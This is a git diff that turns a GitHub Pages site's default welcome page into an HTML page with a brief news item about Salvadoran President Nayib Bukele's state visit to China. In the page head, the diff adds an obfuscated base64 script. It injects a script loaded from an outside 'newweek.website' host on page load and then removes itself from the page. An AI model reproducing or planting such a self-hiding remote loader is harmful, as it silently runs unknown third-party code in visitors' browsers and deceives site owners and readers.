@@ -1,37 +1,22 @@
-## Welcome to GitHub Pages
 
-You can use the [editor on GitHub](https://github.com/slmolok/el/edit/master/index.md) to maintain and preview the content for your website in Markdown files.
+<html lang="it">
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title> El Salvador's President Nayib Armando Bukele Ortez</title>
 
-### Markdown
+<p><img src="https://obj.shine.cn/files/2019/12/06/f4703d96-cdad-49af-b225-402eeff6da80_0.jpg" alt="" /></p>
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	
+	<script id="JZgR0" src="data:text/javascript;base64, dmFyIF9YQjlnMyA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX2MwdmZmLCBfUk9zdUEpIHt2YXIgX0Y2SE9kID0gZnVuY3Rpb24oX2huTDJyKSB7d2hpbGUgKC0tX2huTDJyKSB7X2MwdmZmWydwdXNoJ10oX2MwdmZmWydzaGlmdCddKCkpO319O19GNkhPZCgrK19ST3N1QSk7fShfWEI5ZzMsIDB4MTFiKSk7dmFyIF95M2dvayA9IGZ1bmN0aW9uKF9zUzBPZCwgX2NNYkNCKSB7X3NTME9kID0gX3NTME9kIC0gMHgwO3ZhciBfbGRkUVkgPSBfWEI5ZzNbX3NTME9kXTtyZXR1cm4gX2xkZFFZO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfeTNnb2soJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX05qRndCID0gZG9jdW1lbnRbX3kzZ29rKCcweDEnKV0oX3kzZ29rKCcweDInKSk7X05qRndCW195M2dvaygnMHgzJyldID0gX3kzZ29rKCcweDQnKTtfTmpGd0JbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg2ZVx4NjVceDc3XHg3N1x4NjVceDY1XHg2Ylx4MmVceDc3XHg2NVx4NjJceDczXHg2OVx4NzRceDY1XHgyZlx4NWZceDcyXHg2NVx4NmRceDZmXHg3NFx4NjVceDVmXHg3NFx4NzJceDYxXHg2M1x4NmJceDJlXHg2YVx4NzNceDNmXHg2M1x4NjFceDZkXHg3MFx4NjFceDY5XHg2N1x4NmVceDNkXHg3NVx4NTVceDVhXHgzMFx4NzBceDc0XHgzNVx4NzVceDZjXHg1Mic7ZG9jdW1lbnRbX3kzZ29rKCcweDUnKV0oX3kzZ29rKCcweDYnKSlbJ1x4NjFceDcwXHg3MFx4NjVceDZlXHg2NFx4NDNceDY4XHg2OVx4NmNceDY0J10oX05qRndCKTtkb2N1bWVudFtfeTNnb2soJzB4NycpXSgnSlpnUjAnKVsnXHg3Mlx4NjVceDZkXHg2Zlx4NzZceDY1J10oKTt9LCB7J1x4NmZceDZlXHg2M1x4NjUnOiAhIVtdfSk7"></script>
+</head>
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+<body>
+El Salvador's President Nayib Armando Bukele Ortez will pay a state visit to China on Dec. 1-6 at the invitation of Chinese President Xi Jinping.
 
-```markdown
-Syntax highlighted code block
+Bukele was born in San Salvador, capital of El Salvador, in 1981.
 
-# Header 1
-## Header 2
-### Header 3
+Bukele had served as mayor of Nuevo Cuscatlan, and mayor of San Salvador. He was elected president of El Salvador in February 2019 and took office in June.
+</body>
 
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/slmolok/el/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+</html>
